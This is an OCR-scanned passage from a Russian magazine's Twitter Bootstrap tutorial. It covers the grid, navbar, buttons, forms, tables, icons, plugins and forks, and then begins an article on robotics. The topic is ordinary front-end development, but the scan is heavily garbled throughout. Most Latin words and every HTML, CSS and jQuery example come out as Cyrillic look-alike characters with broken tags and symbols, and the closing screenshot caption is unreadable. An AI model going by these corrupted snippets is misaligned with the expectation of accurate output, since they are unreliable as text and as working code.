| | Ьооізігар-гезроп5іѵе[ .тіп] .сзз 

1-1)5/ 

| | Ьооі5ігар[ .тіп] об 

I — ітв/ 

| 8ІурИісоп5-Ьа1Яіпе5.рп§ 

| б!урЬісоп$-Ііа1Ліп85-)л/Іііі:е.рп§ 



Тут все просто: в С55 лежат сами стили, которые необходи- 
мо подключать к проекту (обычный и тіпіИесі), в 35 — скрипты, 
в ітд — специальный пакет иконок от бІурЬісопз. Подключаешь, 
естественно, только по одному файлу (иконки цепляют сами стили). 
Кстати, многие верстальщики часто работают с девелоперской 
версией кода, внося некоторые правки на горячую прямо туда, 
а потом просто используют минифаеры. Строго говоря, это непра- 
вильный подход. Правильный алгоритм будет таким: 

1. подключаешь Ьооізігар.тіп.сзз; 

2. подключаешь Ьооізігар-гезропзіѵе.тіп.сзз; 

3. подключаешь ЬооЫгар.тіп.]з; 

4. указываешь нужные стили оверрайдом в отдельном сзз 
(я обычно называю его сизіот.сзз). 

Таким образом исходный код ВооЫгар остается неизменным 
и свои грязные хаки всегда можно откатить без мучительных вос- 
поминаний о том, что же ты изменил в С55-файле на шесть тысяч 
строк :). 

Кстати, важный момент — не забудь правильно задать правила 
масштабирования страницы: 

<теіа пате="ѵіемрог*" сопіеп!:="місИ:Ь=сІеѵісе-міс11:Іі л «-' 
Іпіііа1-зса1е=1.0"> 

Зта строка не позволит мобильным браузерам масштабировать 
страницу по своим правилам (например, весь сайт в одну колонку 
с вырвиглазным масштабом, как это любит делать Орега МоЬПе), 
предоставляя эти привилегии разработчику. Если вдруг возникнут 
какие-то трудности с базовыми вещами, настоятельно советую 
глянуть оригинальные деПіпд зіагіесі примеры от разработчиков: 
ЬіУу/ М , 20і0у . 

СКАФФОЛДИНГ, НАСТАЛО ТВОЕ ВРЕМЯ! 

Подключив к проекту все необходимые файлы и определившись 
с базовыми настройками, самое время начать верстку. Давай не бу- 
дем тянуть и сразу же сделаем простую, но полностью адаптивную 
разметку элементов страницы. 

Чтобы сразу же верстать адаптивно, необходимо для начала ра- 
зобраться с назначением одного из главных элементов Вооізігар — 
сетки, бгісі (а именно так называется эта штука в терминологии 
фреймворка). Это некое подобие адаптивной сетки, сверстанной 
на дивах, в ячейки которой можно размещать элементы интерфей- 
са. Фишкой грида является то, что в нем уже заданы правила по- 
ведения при уменьшении размеров страницы (естественно, только 
позиционные, сами стили для изменения, например, размеров 
шрифтов прописываются отдельно). 

По дефолту вся рабочая область делится на 12 ячеек по шири- 
не. Ширина ячейки вычисляется в процентах от текущей ширины 



ОФОРМЛЕНИЯ НА ОСНОВЕ ТѴѴІТТЕК 
В00Т5ТКАР ДЛЯ ПОПУЛЯРНЫХ СМ5 



д оо.д І /5ІК9К — пример темы для популярного блогового движка 
ІЛ/огсІРгезз; 

доо.дІ/ѴЬХХз — альтернативная тема для ѴѴогсіРгезз на Вооізігар; 
доо.дІ/ТдѴѴ47 — шаблон оформления, созданный на ТѵѵіКег Вооі- 
зігар для РгираІ; 

доо.дІ/а7Р5Н — альтернативный вариант Вооізігар для йгираі; 
доо.дІ/ЕЕрРг — шаблон для популярной сегодня системы МосіХ; 
доо.дІ/бкХТВ — Вооізігар в связке ТуроЗ; 
дор.дІ/8х801 — пример для фреймворка Ѵіі. 



ХАКЕР 01 /168/2013 



091 



кодинг 



окна браузера. Кстати, количество ячеек в строке (а соответствен- 
но, и ширину отдельной ячейки) и другие важные переменные, 
исползуемые во время верстки, ты всегда можешь изменить 
штатными средставами Вооізігар, получив специально кастоми- 
зированный файл стилей. Давай создадим грид из одного ряда 
стремя ячейками. 

<сііѵ с1а55="гом"> 

<с!іѵ с1а55="5рап4">Первая ячейка</с!іѵ> 

<с!іѵ с1а55="5рап4">Вторая ячейка</с!іѵ> 

<сііѵ с1а55="5рап4”>Третья ячейка</сІіѵ> 

</сііѵ> 

Класс .гоѵѵ у дивов задает ряд-контейнер, в котором разме- 
щаются сами ячейки. Сами ячейки задаются классами зрапІЧ, где 
N — количество ячеек, на которое простирается ячейка. Важно 
помнить, что сумма ячеек в гоѵѵ должна равняться общему воз- 
можному количеству ячеек в гоѵѵ — в нашем случае это 12. То есть 
ты можешь задать зрап4, зрап2, зрап4 и зрап2, но никак не три 
зрапб в одном гоѵѵ, иначе верстка просто «разъедется». Кстати, 
если хочешь поставить «спэн» не с начала ряда, юзай дополни- 
тельный класс оНзеІІЧ (работает по схожему принципу), где N — 
длина отступа в зрап'ах. 

Если взглянуть на официальный деМіпд зіагіесі, можно заме- 
тить, что контент обычно оборачивается в блок .сопіаіпег. Тут надо 
понимать что контейнеров, как и гридов существует два вида — 
с ограниченной максимальной шириной (сопіаіпег) и полностью 
резиновый (сопІаіпІег-Лиіс)). В зависимости оттого, какой тип 
контейнера нужен, юзай соответствующие гоѵѵ или гоѵѵ-ЛиісІ. 

С адаптивностью связан еще один важный момент. ВооЫгар 
реагирует на изменение размера не по каждому событию ресайза, 
а только при переходе через определенные пограничные точки. 

То есть реально верстка поменяется (изменится ширина ячеек 
и их позиционирование), например, при изменении ширины окна 
от 980 к 979 пикселей, но не при переходе с 979 к 978. Таких кон- 
трольных точек может быть несколько, а их значения ты можешь 
менять через директиву 

(Этпесііа (тіп-місІТН: 768рх) апсі (тах-місНЬ : 979рх) { 

> 

Кстати, забегая вперед, скажу, что через эти же директивы 
удобно задавать размеры и внешний вид и других элементов стра- 
ницы, например динамически менять размер заголовков, чтобы они 
всегда выгодно смотрелись при нахождении в заданном диапазоне 
ширины страницы. Ну а если какой-то элемент дизайна уж совсем 
никак не вписывается в планшетное и смартфонное представление, 
можешь заюзать стили ѵізіЫе-рЬопе, ѵізіЫе-ІаЫеІ, ЫсМеп-рЬопе, 
ЫсІсІеп-ІаЫеІ для стопроцентного контроля представления верстки 
на самых разнообразных девайсах. Не правда ли, удобно? 



ВРЕМЯ КОДИТЬ! 

С размещением элементов разобрались. Теперь пришло время на- 
полнить нашу страницу смыслом. 

Один из самых узнаваемых элементов Вооізігар — это, конечно 
же, паѵЬаг, горизонтальная черная топ-панель с элементами меню. 
Сразу оговорюсь, что навбар может содержать не только линки 
на разделы, но и формы ввода, кнопки, дропдауны, дивайдеры 
и еще кучу всего. Возникает вопрос: как все это богатство будет 
реагировать на изменения ширины страницы? Очень просто! 

При переходе через очередную контрольную точку все содержимое 
навбара, кроме логотипа (который опционален, как и любой другой 
элемент в Вооізігар'е), будет прятаться под кат, а на навбаре оста- 
нется лишь кнопка, позволяющая по необходимости развернуть 
все многообразие навигационных элементов. Кстати, учитывай, 
что, несмотря на то, что базовые стили бутстрэпа прекрасно обхо- 
дятся и без большинство фишек, связанных с адаптивностью, 
будет работать только при наличии подключенной библиотеки 
]Оиегу и ЬооЫгар.із, содержащих в себе все многообразие по- 
ведения элементов Вооізігар. Если все это тебе нужно не целиком, 
а только частями (например, у тебя нет модальных окон), ты мо- 
жешь подключить только необходимые модули. Например, чтобы 
сработала вышеописанная фишка с катом для навбара, подключи 
скромную библиотеку Ьооізігар-соііарзе.із (в стандартном пакете 
не поставляется, нужно отдельно скачать на странице кастоми- 
зации), ну и іОиегу, естественно. Такой подход позволяет юзать 
только то, что реально нужно, не обвешивая страницу здоровенным 
Ьоо1з1гар.тіп.]з с примочками на все случаи жизни. Полный список 
модулей доступен на странице кастомайзера ( ЬіІ.Іѵ/ТУбзаі ). 

Но довольно теории, делаем навбар! Пишем в Ьосіу: 

<! -Класс паѵЬаг-бхес1-1:ор фиксирует положение элемента 
наверху страницы--» 

<с!іѵ с1азз="паѵЬаг паѵЬаг-бхесІ-*ор"> 

<сііѵ с1азз="паѵЬаг-іппег"> 

< ! -По всей ширине страницы--» 

<сііѵ сІазз^'соп-Саіпег-ЛиісГ» 

<! -Кнопка показа ката при уменьшении размеров—» 

<а с1азз="ЬТ:п ЬТп-паѵЬаг" ЦаТа-То§§1е="со11ар5е".-' 
ЦаТа-Таг§еТ=" .паѵ-соііарзе"» 

<зрап с1а55="ісоп-Ьаг"></зрап> 

<зрап с1а$5="ісоп-Ьаг"»</зрап> 

<зрап с1а55="ісоп-Ьаг"></зрап> 

</а> 

<! -Логотип. Опционально, но бывает нужно--» 

<а сІазз^ЬгапсГ Ьге-Р="#">Хакер</а> 

<!-- Закидываем ри11-гі§Іі1 'ом дропдаун вправо--» 

<и1 с1аз5="паѵ ри11-гІ8ІтС’ , > 



КАТСНЕТ — «В00Т5ТРАР» ДЛЯ 105-РАЗРАБОТЧИКОВ 



Если ты занимаешься разработкой программ для 
Ю5, то фреймворк РаІсЬеІ (доо.д|/г оР7д ) однознач- 
но должен обосноваться в твоем девелоперском 
чемоданчике. С его помощью построить прототип 
интерфейса будущего приложения — дело десяти 
минут. За счет чего достигается такая скорость? 

Дело в том, что в коробке с РаІсНеІ по- 
ставляются готовые прототипы большинства 



элементов управления, применяемых в Ю5. Тут 
тебе и пимпы, переключалки, формы списков и 
многое другое. 

Помимо графических финтифлюшек, в пакет 
РаІсИеІ входит специальный ^-сценарий, 
позволяющий объединить с помощью Аіах все 
страницы прототипа. Таким образом, болванка 
становится похожей на реальное приложение. 



Реалистичности также добавляет картинка с 
изображением іРЬопе, на фоне которой идет 
тестирование заготовки. 

Для быстрого знакомства с РаІсЬеІ я реко- 
мендую посетить официальный сайт проекта и 
пробежаться по документации. Создатели про- 
екта постарались и сделали ее по-настоящему 
интерактивной. 



092 



ХАКЕР 01 /168/2013 



Швейцарский нож для III 




Главное меню средствами ВооЫгар 







Симпатичный РгодгезвВаг 

<1і с1а55="сігорсІомп"> 

<а Нге-Р*"#" с1а55="сІгорсІомп-^о§8Іе” «-• 
сІа‘Са-'1:о§§1е="сІгорс1омп">и5ег</а> 

<и1 с1а55="с1горс1омп-піепи ,, > 

<!- -Перечисляем элементы дропдауна--> 

<1іха Нге-Р="/">Настройки</ах/1і> 

<1іха Ьге-Гг'Ѵ'^Выходс/ах/Іі» 

</и1> 

</1і> 

</и1> 

<с!іѵ с1а55="паѵ-со11ар5е"> 

<и1 с1а55="паѵ"> 

<!--Сами страницы навигации- -> 

<1іха Ьге-Р="#">Взлом</ах/1і> 

<1іха Ьге-Р="#">Ма1маге</ах/1і> 

<! --Активный эелмент меню--> 

<1і с1а55="аЫіѵе"ха Ьге-Р=”#”Жодинг</ах/1і> 
</и1> 

</сііѵ> 

</с!іѵ> 

</СІІѴ> 

</ СІ І V > 



Кстати, по умолчанию навбар будет белым. Чтобы сделать его 
классическим черным, добавь класс паѵЬаг-іпѵегзе. 

С навбаром связан еще один любопытный модуль — БсгоІІзру. 
Ты наверняка видел этот эффект на множестве сайтов, когда 
в зависимости оттого, докуда ты доскроллил, меняется активный 
элемент навбара (бывает полезно при длинных страницах с логи- 
чески разделенными блоками). Так вот, перед тобой реализация 
этой фичи в ВооЫгар. Подключай модуль со страницы ^ѵазсгірі 
( ЫМу/оЗбЗЮ ) и простейшими навигационными линками управляй 
навигацией на странице. Больше инфы по приведенной ссылке — 
там все достаточно просто. Только не забудь зафиксировать сам 
навбар наверху страницы, а то фишка-то будет, но пользователь ее, 
увы, не увидит. 

С навбаром разобрались, погнали дальше :). 

ФОРМИРУЕМ ФОРМЫ 

Огромный плюс Вооізігар в том, что, просто выбрав нужные клас- 
сы, ты получаешь профессионально выглядящие веб-приложения 
с минимальными усилиями. Так, чтобы разместить стандартную 
кнопку, используй следующий код: 

<ЬЫіоп с1а55="Ып Ып-1аг§е" іуре=”ЬиЫоп">«-; 

І_аг§е ЬиЫоп</ЬиЫоп> 

Стилями Ып-Іагде, Ып-зтаІІ и так далее ты можешь управ- 
лять размерами кнопок (они высчитываются динамически). А их 
внешний вид можно легко изменить классами вроде Ып-ргітагу, 
Ып-зиссезз. Кстати, если тебе чем-то не угодили стандартные 
цвета в предопределенных стилях, можешь использовать множе- 
ство генераторов цветовых стилей, доступных в Сети, или просто 
поменять значения переменных при генерации кастомного стиля 
( ЫЦу/оЗбЗЮ ). И кстати, использовать обычные іприГы вместо 
ЬіШоп'ов также не возбраняется — вышеобозначенные стили от- 
лично сработают и на іприі'ах типа зиЬтіІ. 

Кстати, с кнопками связана еще одна особенность. Легким 
движением руки ты можешь сделать очень удобную группу пере- 
ключателей, используя ЗаѵаБсгірІ-плагин ЬооІзІгар-ЬиМоп^з. 
Делается это примерно так: 

<(ііѵ с1а55="Ып-§гоир" сІаТа-Т:о§§1е= ,, Ьи1'Соп5-сІіескЬох"> 
<Ьи«оп іуре="Ьи«оп" с1а55="Ы:п Ып-ргітагу">1*^ 
</ЬиЫоп> 

<Ьи«оп *уре= и ЬиЫоп" с1азз="Ы:п Ып-ргітагу" >2^ 



АРГУМЕНТЫ ЗА 



1. Универсальность. ТѵѵіМбГ Вооізігар подходит для проектов 
любой сложности и масштаба. 

2. Прозрачностьидружественностькразработчику.ВооІзІгар— 
свободный и бесплатный продукт. Его исходный код всегда 
доступен на біІНиЬ, а разработчики рады новым форкам. Ис- 
пользованиефреймворкатакже не вызываетсложностей и все в 
большей мерезависитотимеющегосяобъемазнаний. 

3. Поддержка І.Е55. Для многих современных проектов возмож- 
ностей стандартного С55 не хватает. Дизайнерам тоже стали 
нужны «переменные» и другие кодерские штучки вроде 
вложенности функций и операторов . Эту проблемууспешно 
решаеттехнология 1.Е55. Разработчики ТѵѵіНег Вооізігар не 
могли обойти этотфактстороной, поэтому возможность при- 
менять ЬЕББзаложена в фреймворке из коробки. 

4. Подробная документация. На сайте проекта и біІНиЬ'е 
представлена хорошая документация, позволяющая взять 



быстрый старти найти ответы на возникшие вопросы. Вся те- 
ория разбавлена примерами, которыетутже можно оценить в 
действии. 

5. ПоддержкаіОиегу-плагинов. С ВооЫгар поставляется 
специально разработанный набор плагинов, позволяющихза 
считаные минуты добавить динамичности. 

6. Кроссбраузерность. Созданные с помощью ВооЫгар 
приложения хорошо отображаются нетолько последними 
версиями популярных браузеров, но и ихпредками. Конечно, 
добиться совместимости по отображению стакими древними 
монстрами, как ІЕ5/6, разработчикам неудалосьіа нужна ли 
она?). Порядок начинается с ІЕ7 и выше, что на сегодняшний 
день просто замечательно. 

7. Поддержка НТМ1.5/С553. Ко всем новым фишкам НТМІ_5 
фреймворк относится положительно и поощряет их примене- 
ние в очередном проекте. 



ІУАУАѴІ 

• Ь00І5ПІрр. 

сот — многие 
вещи, которые 
элегантно делаются 
с помощью Вооі- 
5ігар, уже сделаны 
и выложены 
ввидесниппетов 
на проекте Вооі- 
Бпірр. Перед тем 
как ломать голову 
и разбираться 
в классах — 
обязательно 
воспользуйся этим 
ресурсом; 

• доо.дІ/ЬОивт — 

официальный сайт 
проекта Тѵѵіиег 
Воо($(гар. 



ХАКЕР 01 /168/2013 



093 




кодинг 



</Ьи**оп> 

<ЬігНоп 1уре* *"Ьи«оп" с1аБ5="Ы:п Ы:п-ргітагу">3«-' 
</Ьи**оп> 

</сііѵ> 

Такой код создаст группу кнопок, каждая из которых будет 
работать таким же образом, как бы функционировал обычный чек- 
бокс. А если хочешь сделать на основе этого же плагина орІіопЬох, 
нет ничего проще — просто замени соответствующий стиль и... 
вуаля! 

<с!іѵ сІаББ^'Мгп-вгоир" с!аТа-1ое8Іе=’ , ЬиТТоп5-сЬескЬох И > 



Текстовые формы создаются тоже очень просто, для этого до- 
статочно специального стиля. Ничего сложного: 

<іпри1: Туре="*ех* и с1а55="іпри*-5та1Г’ 
р1асеИо1с!ег= ,, Етаі1 ,, > 

Класс .іприЬзтаІІ работает по такому же принципу, 
как и с кнопками. Полный список стилей ты можешь посмотреть 
на странице Ьі1.Іѵ/24Х1НВ . 

А теперь давай попробуем совместить полученные знания 
и сделать классную стилизованную форму ввода с кнопкой от- 
правки: 

<сііѵ с1а55="іприТ-аррепсГ> 

сіприі с1а55= И 5рап4 И ісI= ,, аррепсIесIIприТВиТТоп ,, «-• 
*уре*"*ех*"> 

<ЬиТ1:оп сІаББ^'Ь^п" ■Суре= ,, ЬиПоп И >Создать</Ьи1:Топ> 
</сііѵ> 

Конечно, это не все трюки, которые можно проворачивать 
со стандартными элементами ввода на формах. Так, я не рассказал 
о возможностях ргерепб-подсказок в текстовых полях, выпадаю- 
щих прямо из кнопок списках (требует наличия соответствующего 
плагина Ьіі.Іѵ/НВІерЫ и многом другом, но я думаю, что, посмотрев 
соответствующую документацию, ты без труда разберешься и сде- 
лаешь все по аналогии. Главное — понять принцип, по которому 
происходит стилизация элементов формы в Вооізігар. Дальше 
поговорим о таком архаичном инструменте веба, как таблицы. 

ТАБЛИЦЫ? НЕ, НЕ СЛЫШАЛ 

Да-да, я знаю, что таблицы у девелоперов нынче не в чести и бо- 
лее предпочтительна гибкая и настраиваемая блочная верстка. 
Однако бывают моменты, в которых без их использования просто 
не обойтись. Было бы глупо полагать, что разработчики ВооЫгар 
не подошли к этому вопросу со всей серьезностью и не продумали 
удобный способ формирования этих элементов: 

<-СаЫе с1а55="1:аЫе *аЫе-5*гіресГ> 

<ТНеасІ> 

<1:г> 

<*Ь#</1:Ь> 

<1:Іі>Рубрика</1Н> 

<*Іі>Количество статей</-СИ> 

<1Ь>Количество авторов</'Ыі> 

</Тг> 

</ТЬеасІ> 

<*ЬосІу> 

<*г> 

<ТсІ>1</1:гі><тд>РС_20МЕ</Т:й><Т:а>4</1:(і><'1:гі>6</Т:сі> 

</*г> 

<*г> 

<1:сІ>2</ , СсІ> <1сІ> КОДИНГ </*с1><*(і>4</ , СсІ><1:сІ>7</ , 1:сі> 

</Тг> 



</і:ЬосІу > 

</*аЫе> 

Тут ничего необычного. ВооЫгар поддерживает стилизацию 
таблиц классами вроде .ІаЫе-БІгірес! (зебра-стайл) или .ІаЫе- 
сопбепзесі (делает таблицу более компактной). Но ты думаешь, я бы 
стал писать о таком примитиве, если бы тут не было чего-то более 
важного? 

Дело в том, что при верстке через дгісі зачастую возникает не- 
обходимость задать ряды неравнозначной «высоты». Например, 
когда в левой части страницы у тебя форма ввода с пятью полями 
(каждое, естественно, в своем ряду), а в правой должна быть 
сплошная картинка, подсказка или просто даже баннер, который 
должен простираться на все эти пять рядов по высоте и при этом 
технически представлять собой один-единственный гоѵѵ. Одним 
из решений подобной проблемы и является использование таблиц. 
Они в ВооЫгар точно такие же, как и дгісі'ы, и поддерживают дина- 
мическое изменение размеров классами БрапЫ. Просто оперируй 
атрибутами гом/зрап, и ты сможешь сверстать практически любую 
композицию :). 

ГРАФИКА ВУ еі-ѴРНІСОМБ 

Важным пунктом в графической составляющей ВооЫгар является 
возможность буквально одной строкой кода вносить легкие штри- 
хи в элементы дизайна стильными и вебдванольными иконками 
от бІурЬісопз ( ЫЦѵ/гдІкБі ). Иконки подцепляются самими стилями 
и могут быть использованы практически везде. Так, для создания 
кнопки-линка (именно линка, с инпутами именно такой метод 
не прокатит!) просто создай элемент <і> и укажи ему соответству- 
ющий класс: 

<а с1а55="ЬТп ЬТш-ргітагу'' Иге-Р="#"><і с1а55="ісоп-и5ег ♦-* 
ісоп-мИі*е"х/і> Хакер</а> 

Стиль ісоп-ѵѵЫіе указывает на то, что иконку надо брать из «бе- 
лого» пакета графики (нужно для кнопок «темных» стилей типа 
ргітагу, ѵѵагпіпд, іпѵегзе и так далее). 

МАЛЕНЬКИЕ ПРИЯТНОСТИ 

Бутстрэп поражает своей продуманностью. Почти на каждую ме- 
лочь, которая может понадобиться в повседневной верстке, у раз- 
работчиков найдется великолепное решение. Среди таких мелочей 
(естественно, не все): 

• Алерты. Просто задай сііѵ'у класс аіегі с аіегі-еггог или аіегі- 
зиссезз, е*с. и получишь симпатичный и стильный информаци- 
онный бокс, отлично подходящий для всяческих уведомлений. 
Не забудь добавить ему сіове ЬиКоп со страницы 35-плагинов. 

• Аббревиатуры. Простой и понятный способ показа пояснений 
или уточнений. 

<аЬЬг *і*1е="ІТ-мурзилка">Хакер</аЬЬг> 

• Адреса. Здесь без комментариев — ѵѵогкз Ііке а сНагт. О фор- 
мате можешь справиться на ЬіІ.Іу/5д5МРІ . 

<асІсІге55> 

<5*гоп§>Хакер</5Т:гоп§><Ьг> 

Ленинская слобода, 19<Ьг> 

Москва, Россия<Ьг> 

<аЬЬг *і1:1е="Телефон">Т:</аЬЬг> (495) 123-4567 
</агі(1ге55> 

• Цитаты. Простые и стильные. 

<Ыоскдио1:е> 

<р>Отличный журнал! </р> 

</Ыоскдио*е> 



094 



ХАКЕР 01 /168/2013 



Швейцарский нож для III 



• Информационные лейблы: 

<зрап сІа55="ІаЬеІ ІаЬеІ-$иссе55">Готово</5рап> 

• Симпатичные значки: 

<зрап сІа55="Ьасіде ЬасІде-іп(о">Новый</5рап> 

• Всплывающие подсказки. Думаю, нет нужды объяснять, 

для чего они могут понадобиться. Разметка, как обычно, чрез- 
вычайно проста: 

<а Ііге-Р="# и ісі=ЧооШр1 и ге1='ЧооШр” — 
сІаТа-р1асетепТ= , Чор и с!аТа-огі§іпа1-ТіТ1е=«-< 

"Создатель РгосМоп">Марк Руссинович</а> 

Для активации тултипа через іОиегу используй функцию: 

$( ЧИіооШрІ' ) .гооШр(орІіоп5) 

В качестве орііопз может задаваться набор параметров отсюда: 

Ы11у/гЖ2УУ 

• Модальные окна. Герой нашей статьи позволяет с удивитель- 
ной легкостью реализовывать и сложные диалоговые окна не- 
сколькими строками кода. Нужно только не забыть подключить 
плагин Ьооізігар-тосіаі^з — если, конечно, он уже не включен 
в твой ЬооІ5Ігар.тіп.]5 (что, впрочем, относится и ко всем 
остальным ^-плагинам). С целью экономии места в журнале 
не буду приводить полный код, скажу только, что существуют 
два способа работы с модальными окнами — с помощью атрибу- 
тов и через .ЛБ. За подробной информацией отправляйся сюда: 
Ьіиу/АѵѵгАсік . 

Опять-таки, я перечислил далеко не все плагины и приятные 
мелочи фреймворка, а специально пробежался только по неко- 
торым фичам Вооізігар для того, чтобы представить тебе хотя бы 
часть из того гигантского инструментария верстальщика, который 
дает нам Тѵѵіиег Вооізігар. 

ФОРКИ И ТВИКИ ТѴѴІТТЕВ В00Т5ТРАР 

Успех проекта вдохновил многих разработчиков на создание фор- 
ков — альтернативных реализаций продукта. Всем понравилась 
идея использовать фреймворк для быстрого создания интерфейсов 
в определенном стиле. Таких форков много, и каждый из них до- 
казывает, что Тѵѵіиег Вооізігар способен не только на оформление 
в стиле Тѵѵіиег, но и на многое другое. 

Например, если новый интерфейс сервисов Соодіе вызывает 
утебя приятные эмоции, то обязательно попробуй форк Ріиззігар 
( хЬгеакег.дііЬиЬ.сот/рІиззІгар ). Это тот же ВооЫгар с одним лишь 
отличием — внешний вид всех элементов сделан в стиле обнов- 
ленного дизайна приложений «корпорации добра». 

Аналогичная ситуация с любителями стиля интерфейса Меіго, 
принятого на вооружение в новоиспеченной ѴѴіпсІоѵѵз 8. Им обя- 
зательно стоит попробовать форк Вооітеіго [ аогога.оііНиЬ.сот / 
Ьооітеіго ). Ну а фанатов социальной сети РасеЬоок явно тронет 
РВооЫгар ( скгаск.аННиЬ.сотЛЬооЫгарр ). 

Казалось бы, куда уже проще? Хорошая документация, по- 
нятный код позволяют успешно применять этот фреймворк веб- 
мастерам с разным уровнем знаний, но, оказывается, упрощению 
нет предела. «А что тут еще упрощать? Вроде все и так прозрач- 
но!» Я тоже так считаю, однако яростные фанаты другого мнения. 
Ведь только так можно объяснить появление различных вспо- 
могательных сервисов, делающих работу с Тѵѵіиег Вооізігар еще 
проще. 

Вот взять хотя бы проект ВооіБѵѵаІсЬг ( ЬооЕзѵѵаісЬг.сот І. Его 
услуги пригодятся, если ты вдруг решишь внести изменения 



в стандартный дистрибутив Тѵѵіиег Вооізігар. Говоря другими сло- 
вами — «стилизовать фреймворк под себя». 

Я понимаю, что ты парень не промах и готов все сделать ручка- 
ми в СББ-файлах, но в ВооіБѵѵаІсЬгте же самые операции делаются 
на порядок быстрей. А все потому, что сервис предоставляет удоб- 
ный интерфейс для внесения изменений. Например, если ты захо- 
тел иначе оформить типовые кнопки, то просто выбираешь раздел 
ВіШопз и сразу приступаешь к правке нужных свойств (например, 
изменению цвета фона). Процесс напоминает использование объ- 
ектного инспектора в различных средах разработки. Такой подход 
действует для изменения всех элементов интерфейса. В общем, 
запутаться и потеряться однозначно не получится. 

При стилизации Тѵѵіиег ВооЫгар тебе придется поломать голову 
и хорошенько продумать будущую цветовую гамму элементов управ- 
ления. В стандартном оформлении все цвета хорошо сбалансиро- 
ваны, поэтому на выходе ты и получаешь шедевр, который почти 
никому не режет глаз. 

При создании своего оформления вся работа по выбору цве- 
тов ложится на твои плечи. На первый взгляд может показаться, 
что сложного здесь ничего нет, но это только на первый. Подбирать 
цвета нужно с умом, и если здесь нет опыта, то первый блин обя- 
зательно выйдет комом. Чтобы как-то упростить эту задачу, и был 
создан сервис І_аѵІ5Н ( ѵѵѵѵѵѵ.ІаѵізЬЬооІзиар.сот І. 

При помощи этого креативного решения создание цветовой 
схемы упрощается до нескольких кликов мышкой. Тебе достаточно 
скормить І-аѵізЬ изображение, а он займется его анализом и созда- 
нием на его основе цветовой схемы. Как показала практика, цвета 
подбираются достаточно хорошо (все зависит от исходного изобра- 
жения) и они вполне пригодны для применения в реальном проекте. 

Хорошо, как стилизовать и правильно подбирать цвета для лю- 
бимого фреймворка, ты знаешь. Значит, теперь пора переходить 
к самому вкусному. Оказывается, что создавать красивые прототипы 
приложений в некоторых случаях можно, вообще не прибегая к на- 
писанию и без того простого кода. В инете есть несколько сервисов, 
позволяющих прототипировать будущее приложение с помощью 
визуальных конструкторов. 

В них тебе лишь требуется кидать на формочки нужные элементы 
управления (примерно так же, как это делается в ѴізиаІ Біисііо или 
йеІрЬі) и устанавливать необходимые свойства. После завершения 
проектирования весь созданный проект помещается в архив, кото- 
рый впоследствии сохраняется на компьютер для дальнейшей раз- 
работки. Одним из таких сервисов является ЗеЫгар ( іеіБІгар.сот ). 
Пока авторы проекта не взимают плату, поэтому пользоваться этим 
сервисом можно в любых объемах, не отдавая ни копейки. 

ВЫБОР ЗА ТОБОЙ 

Есть такая старая шутка о том, что люди после смерти попадают 
в чистилище, а верстальщики — в версталище. Так вот, используя 
Вооізігар, ты сможешь избежать подобной радости благодаря чисто- 
му, прозрачному и валидному коду. :) Конечно, невозможно вместить 
даже беглый обзор всех основых фишек Вооізігар в шестистра- 
ничный формат, да и нашей целью было не это. Главное — это дать 
первичное понимания о настоящих возможностях этого мощнейшего 
фреймворка и заострить твое внимание на ключевых направлениях, 
в сторону которых нужно копать. Всегда помни, что Вооізігар — это 
не просто набор стилей, а настоящий функциональный фреймворк 
для III, который в некоторых случаях полноправно определяет биз- 
нес-логику самого приложения. И если что-то тебе кажется нелогич- 
ным и нереализуемым, просто загляни в документацию — уверяю 
тебя, ты найдешь решение своей проблемы. 

Вообще, использовать или нет в своих веб-приложениях С55- 
фреймворки — личное дело каждого. Нельзя сказать, что проект, 
основанный на фреймворке, хуже или лучше. Это лишь инструмент, 
способный в умелых руках творить чудеса и экономить время. 

Он не сможет сделать всю работу за тебя, но он может помочь за- 
крыть глаза на некоторые рутинные моменты, чтобы девелопер 
сосредоточился на более важных задачах. ш 



ХАКЕР 01 /168/2013 



095 



кодинг 



Василий Гай [ѵк.сот/іадааѵ, ѵазіііу.даійдтаіі.сот) 



СТАНЬ 

РОБОТОТЕХНИКОМ! 




Выключая компьютер, ты 
уходишь с работы пораньше, 
чтобы поскорее засесть за 
компьютер домашний? Хватит 
это терпеть, надо заканчивать 
с компьютерной зависимостью! 
Впрочем, резко бросать нельзя. 
Поэтому мы предлагаем тебе 
компромиссное хобби — 
стать робототехником. Порог 
вхождения — низкий. Для 
начала тебе нужен компьютер, 
пара сотен баксов на робота 
(см. врезку) и эта статья. 



ВВЕДЕНИЕ 

В настоящее время существует большое коли- 
чество пакетов для разработки программного 
обеспечения роботов. Один из таких пакетов — 
МісгобоК РоЬоІісз йеѵеіорег Біисііо (МР05). В со- 
став МЯ05 входит ѴівиаІ Бітиіаііоп Епѵігоптепі 
(симулятор), ѴівиаІ Ргодгаттіпд 1_апдиаде (ѴРЦ 
визуальный язык программирования), библиоте- 
ки для организации параллельных и распреде- 
ленных вычислений. 

Язык визуального программирования пред- 
назначен для разработки программ управления 
роботом без записи текста программы. Процесс 
программирования на ѴРІ_ состоит в размещении 
на диаграмме (диаграмма — программа на языке 
ѴРІ_) управляющих блоков и соединении их свя- 
зями для определения порядка выполнения. 

Диаграмма, созданная в ѴРЦ может управ- 
лять как реальным роботом, так и роботом в си- 
муляторе. Поэтому, отладив диаграмму на роботе 



I*. (троп М«пі*ец 



ІКоЬоі.СгеаІе.$іітіІаІіоп.МапНе»«.хтІ 

іит $ пи'аіео О«о* пс О Ог>ѵ« 

4«токеп«.Мапі(е*(.хтІ 
• ІІЛПі: $>тиІ«М й«п«г с 0<КвГ#п1.» Опѵ* 
ОгіѵеВуѴоі<«&іт.тапИе*(.хтІ 

іі»т $ітиІ«М6 $*пвгі с 0 а Опѵ* 

^ 5и«» аі *ІтиІаМ46<Я*Г*п(іаІ0ЛѴ« 



> ііаги $ітді«ев оепепс О^еге-ѵа Спѵ« 



МиІіірІе$ітиЫе<)КоЬоІ».М«пі<е»(.хтІ 



5игг* 5ітиІ»1*0 Оепепс ОМегепііаі Опѵе 
** ііаггі II іітиІа!едв’Ивгеп!.а!<Іпѵе 
МиІІірІс&ітиЫедКоЬоН.МапіІеіі.хтІ 
$»аги $<тиіе«ев Оепепс О^егегі а Опѵе 
$игм аі і‘тиіа!*вО‘Н«г«пі,аів'і\*С 



ОгіѵеІпАгс».тапі(е«І.хтІ 

5іа Пі. 5'пи'аіео Оепепс 0 а Опѵе 
** іііт аі $іпніІаи4а<Иег«тіМпѵ* 
ОгіѵеІпАгс».тапі(е*(.хтІ 

5и«* $>тиіа(*а Оепепс 0*вгепр*1 Опѵ« 
** С*»,». м 



1 <Ж 1 ( СмкЧ | 



